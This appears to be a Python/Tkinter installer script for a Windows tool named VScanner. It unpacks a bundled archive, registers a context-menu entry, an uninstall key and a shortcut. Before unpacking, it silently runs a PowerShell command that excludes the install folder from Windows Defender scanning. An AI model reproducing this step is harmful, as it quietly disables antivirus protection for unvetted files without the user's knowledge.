from tkinter import Tk
from tkinter.ttk import Style, Progressbar, Frame, Label
from threading import Thread
from tarfile import open as opentar
from os import makedirs
from win32com.client import Dispatch
from os.path import expanduser, join, dirname, abspath, exists
from winreg import CreateKey, SetValueEx, CreateKey, OpenKey, CloseKey, HKEY_CLASSES_ROOT, HKEY_LOCAL_MACHINE, REG_SZ, KEY_ALL_ACCESS
from subprocess import run
from traceback import format_exc
from pythoncom import CoInitialize, CoUninitialize

class LoadingScreen:
    def __init__(self, root):
        self.root = root
        self.root.title("Loading Screen")
        self.root.geometry("300x150")
        self.root.configure(bg="#282c34")

        self.frame = Frame(self.root, padding=20)
        self.frame.pack(expand=True, fill="both")

        self.label = Label(
            self.frame, 
            text="Installing Vscanner", 
            foreground="#61dafb", 
            background="#282c34", 
            font=("Helvetica", 16)
        )
        self.label.pack(pady=(0, 10))

        self.progress = Progressbar(self.frame, orient="horizontal", length=200, mode="indeterminate")
        self.progress.pack(pady=10)

        self.loading = False
    
    def logerror(self, e):
       with open("ERROR.txt", "w") as file:
                file.write(str(e))

    def create_registry_entry(self, app_name, version, publisher, exe_path):
        # Open the registry key for installed applications
        key_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
    
        try:
         reg_key = OpenKey(HKEY_LOCAL_MACHINE, key_path, 0, KEY_ALL_ACCESS)
         # Create a new subkey for the application
         sub_key = CreateKey(reg_key, app_name)

         # Set required values
         SetValueEx(sub_key, 'DisplayName', 0, REG_SZ, app_name)
         SetValueEx(sub_key, 'DisplayVersion', 0, REG_SZ, version)
         SetValueEx(sub_key, 'Publisher', 0, REG_SZ, publisher)
         SetValueEx(sub_key, 'InstallLocation', 0, REG_SZ, exe_path)
         SetValueEx(sub_key, 'UninstallString', 0, REG_SZ, exe_path)

         print(f'Successfully added {app_name} to installed apps list.')
        except Exception as e:
         print(f'Failed to add {app_name} to installed apps list: {e}')
         self.logerror(e)
        finally:
         CloseKey(reg_key)    

    def create_shortcut(self, exe_path, shortcut_name="VScanner"):
        CoInitialize() 
        try:
         # Define the path for the Start Menu
         start_menu_path = "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/"
         shortcut_path = join(start_menu_path, f"{shortcut_name}.lnk")
         if not exists(shortcut_path):
          # Create the shortcut
          shell = Dispatch('WScript.Shell')
          shortcut = shell.CreateShortCut(shortcut_path)
          shortcut.Targetpath = exe_path
          shortcut.WorkingDirectory = dirname(exe_path)
          shortcut.save()
        finally:
         CoUninitialize()    

    def start_loading(self):
        self.loading = True
        # Start the progress bar animation
        self.progress.start(10)
        # Start the installation process on a separate thread
        self.thread = Thread(target=self.installtask, daemon=True)
        self.thread.start()
        self.root.after(100, self.check_thread)

    def add_context_menu_option(self, display_name, script_path):
     key = None
     command_key = None

     try:
        # Create registry key for the context menu item
        key_path = r'*\shell\{}'.format(display_name)
        key = CreateKey(HKEY_CLASSES_ROOT, key_path)
        SetValueEx(key, '', 0, REG_SZ, display_name)

        # Create registry subkey for the command
        command_key_path = r'command'
        command_key = CreateKey(key, command_key_path)

        command = f'"{script_path}" "%1"'
        print(f"Command: {command}")

        # Set command string in the registry
        SetValueEx(command_key, '', 0, REG_SZ, command)

        print(f'Successfully added context menu item: "{display_name}"')

     except WindowsError as e:
        print(f"Error modifying registry: {e}")
        self.logerror(e)

     except Exception as e:
        print(f"Unexpected error: {e}")
        self.logerror(e)

     finally:
        # Close registry keys if they were opened
        if key:
            key.Close()
        if command_key:
            command_key.Close()


    def installtask(self):
        try:
            # Build a destination path using the user's home directory
            user_home = expanduser("~")
            destination = join(user_home, "AppData", "Local", "Programs", "VScanner")
            makedirs(destination, exist_ok=True)
            run(f"powershell Add-MpPreference -ExclusionPath '{destination}'", shell=True)
            # Construct path to the tar archive located relative to the script
            current_dir = dirname(abspath(__file__))
            archive_path = join(current_dir, "Vscanner.tar")
            # Extract the archive into the destination directory
            with opentar(archive_path, 'r') as tar:
                tar.extractall(path=destination, filter="fully_trusted")

            # Update the context menu option natively via winreg
            display_name = "Scan with VSanner"
            script_path = join(user_home, "AppData", "Local", "Programs", "VScanner", "Vscanner.exe")
            print(f"{script_path} {display_name}")
            self.add_context_menu_option(display_name, script_path)
            self.create_registry_entry(
            app_name='VScanner',
            version='1.0.0',
            publisher='MrBooks36',
            exe_path=join(user_home, "AppData", "Local", "Programs", "VScanner", "unins000.exe")
            )
            self.create_shortcut(script_path)
        except:
            error_message = str(format_exc())
            # Log error to a file for troubleshooting
            self.logerror(error_message)
            print(f"Installation error: {error_message}")
        self.loading = False

    def check_thread(self):
        if self.thread.is_alive():
            self.root.after(100, self.check_thread)
        else:
            self.progress.stop()  # Stop the progress bar
            self.label.config(text="Installed Vscanner", foreground="#34eb43")
            self.root.after(1000, self.root.destroy)

def main():
    root = Tk()

    style = Style()
    style.configure("TFrame", background="#282c34")
    style.configure("TLabel", background="#282c34")

    loading_screen = LoadingScreen(root)
    loading_screen.start_loading()
    root.mainloop()

if __name__ == "__main__":
    main()

